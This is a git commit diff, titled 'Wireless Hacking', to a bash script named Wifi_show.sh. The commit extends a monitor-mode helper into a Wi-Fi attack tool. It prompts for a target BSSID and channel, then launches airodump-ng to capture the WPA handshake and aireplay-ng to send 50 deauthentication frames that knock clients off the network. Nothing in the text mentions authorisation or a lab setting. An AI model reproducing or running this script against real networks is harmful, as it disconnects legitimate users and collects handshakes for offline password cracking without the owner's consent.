579d4bd96ffa347b5888e84cb5e8e3755a247514
Md. Asif Karim Chayon <mchayon201366@bscse.uiu.ac.bd>
2021-07-01 15:09:53 +0600

    Wireless Hacking

--- Wifi_show.sh
+++ Wifi_show.sh
@@ -3,7 +3,7 @@
 loading() {
 clear
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Run as super user, e.g.\e[0m\e[1;96m sudo bash filename.sh \e[1;93m or\e[0m \e[0m\e[1;96m./filename.sh\n"
-sleep 5 
+sleep 2
 clear
 printf "\e[1;92m"
 printf "\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
@@ -53,8 +53,10 @@ sleep 0.1
 }
 loading
 clear
+#see current interfaces
 ifconfig
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an interface: \e[0m\e[1;96m\en' interface
+#starting monitor mode
 airmon-ng check kill
 clear
 sleep 0.5
@@ -70,7 +72,17 @@ clear
 airmon-ng start $interface
 mode="${interface}mon"
 sleep 2
+#discover wifi networks
 airodump-ng $mode
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Enter BSSID               : \e[0m\e[1;96m\en' bssid
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Enter Channel             : \e[0m\e[1;96m\en' ch
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Enter Handshake File Name : \e[0m\e[1;96m\en' f_name
+sleep 3
+gnome-terminal -e "airodump-ng -c $ch --bssid $bssid -w $f_name $mode"
+gnome-terminal -e "aireplay-ng -0 50 -a $bssid $mode"
+sleep 2 
+stop(){
+#stoping monitor mode
 clear
 sleep 0.1
 printf "\nStoping monitor mode .\n"
@@ -85,6 +97,7 @@ clear
 airmon-ng stop $mode
 sleep 0.1
 clear
+#restarting network manager to managed mode
 sleep 0.1
 printf "\nRestarting network manager .\n"
 sleep 0.75
@@ -97,3 +110,12 @@ sleep 0.75
 clear
 service network-manager restart
 clear
+exit
+}
+while true; do
+printf "\nPress \e[1;93m q\e[0m \e[0m\e[1;96m to stop monitor mode\n"
+read -r input
+if [ "$input" = "q" ];then
+stop
+fi 
+done
